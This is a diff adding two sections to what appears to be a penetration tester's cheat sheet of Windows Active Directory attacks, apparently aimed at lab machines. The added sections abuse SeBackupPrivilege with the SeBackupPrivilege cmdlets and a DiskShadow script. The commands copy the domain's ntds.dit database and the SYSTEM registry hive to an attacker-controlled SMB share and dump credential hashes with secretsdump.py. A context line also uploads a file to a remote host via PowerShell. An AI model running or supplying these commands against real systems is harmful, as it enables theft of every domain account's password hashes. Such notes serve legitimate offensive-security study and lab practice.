@@ -131,6 +131,44 @@ powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.
 ```
 
 
+### ### Copy-FileSeBackupPrivilege
+https://github.com/giuliano108/SeBackupPrivilege
+```
+One way to read and copy files:
+
+upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
+upload /opt/SeBackupPrivilege/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll
+import-module .\SeBackupPrivilegeCmdLets.dll
+import-module .\SeBackupPrivilegeUtils.dll
+Copy-FileSeBackupPrivilege netlogon.dns \programdata\netlogon.dns
+type \programdata\netlogon.dns
+
+```
+
+### ### DiskShadow
+
+```
+put this into a file called vss.dsh:
+
+set context persistent nowriters 
+set metadata c:\programdata\df.cab 
+set verbose on 
+add volume c: alias df 
+create expose %df% z:
+
+
+---
+unix2dos vss.dsh
+upload vss.dsh c:\programdata\vss.dsh
+diskshadow /s c:\programdata\vss.dsh
+
+smbserver.py s . -smb2support -username df -password df
+net use \\10.10.14.14\s /u:df df
+Copy-FileSeBackupPrivilege z:\Windows\ntds\ntds.dit \\10.10.14.14\s\ntds.dit
+reg.exe save hklm\system \\10.10.14.14\system
+secretsdump.py -system system -ntds ntds.dit LOCAL
+
+```
 
 
 ### Ticket generation from Linux
